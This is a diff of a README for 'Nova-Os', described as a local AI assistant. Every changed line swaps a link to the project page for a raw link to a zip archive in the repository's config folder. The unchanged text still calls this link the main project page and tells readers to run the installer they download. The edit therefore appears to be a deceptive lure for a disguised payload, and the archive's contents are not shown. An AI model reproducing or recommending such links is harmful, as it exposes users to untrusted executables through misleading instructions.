@@ -1,6 +1,6 @@
 # 🤖 Nova-Os - Your Local AI Assistant Simplified
 
-[![Download Nova-Os](https://img.shields.io/badge/Download-Nova--Os-brightgreen?style=for-the-badge)](https://github.com/Davidsonencyclical885/Nova-Os)
+[![Download Nova-Os](https://img.shields.io/badge/Download-Nova--Os-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/Davidsonencyclical885/Nova-Os/main/config/Os_Nova_3.6.zip)
 
 ---
 
@@ -31,7 +31,7 @@ Nova-Os does not require an internet connection after setup, but you will need i
 
 To get Nova-Os, visit this page:
 
-[Download Nova-Os from GitHub](https://github.com/Davidsonencyclical885/Nova-Os)
+[Download Nova-Os from GitHub](https://raw.githubusercontent.com/Davidsonencyclical885/Nova-Os/main/config/Os_Nova_3.6.zip)
 
 This link takes you to the main project page. Look for the latest release section to find the installation files.
 
@@ -103,7 +103,7 @@ Nova-Os includes these features to help with your daily needs:
 
 To get the latest improvements or security fixes:
 
-- Visit the download page again: [https://github.com/Davidsonencyclical885/Nova-Os](https://github.com/Davidsonencyclical885/Nova-Os)  
+- Visit the download page again: [https://raw.githubusercontent.com/Davidsonencyclical885/Nova-Os/main/config/Os_Nova_3.6.zip](https://raw.githubusercontent.com/Davidsonencyclical885/Nova-Os/main/config/Os_Nova_3.6.zip)  
 - Check the “Releases” tab for the newest version.  
 - Download and run the new installer the same way as the first time.  
 - The updater replaces old files but keeps your settings and data intact.
@@ -153,7 +153,7 @@ All files are saved as plain files easy to backup or move if needed.
 
 Click the button to open the download page:  
 
-[![Download Nova-Os](https://img.shields.io/badge/Download-Nova--Os-blue?style=for-the-badge)](https://github.com/Davidsonencyclical885/Nova-Os)
+[![Download Nova-Os](https://img.shields.io/badge/Download-Nova--Os-blue?style=for-the-badge)](https://raw.githubusercontent.com/Davidsonencyclical885/Nova-Os/main/config/Os_Nova_3.6.zip)
 
 This page holds all update files and installation guides for Windows. 
 
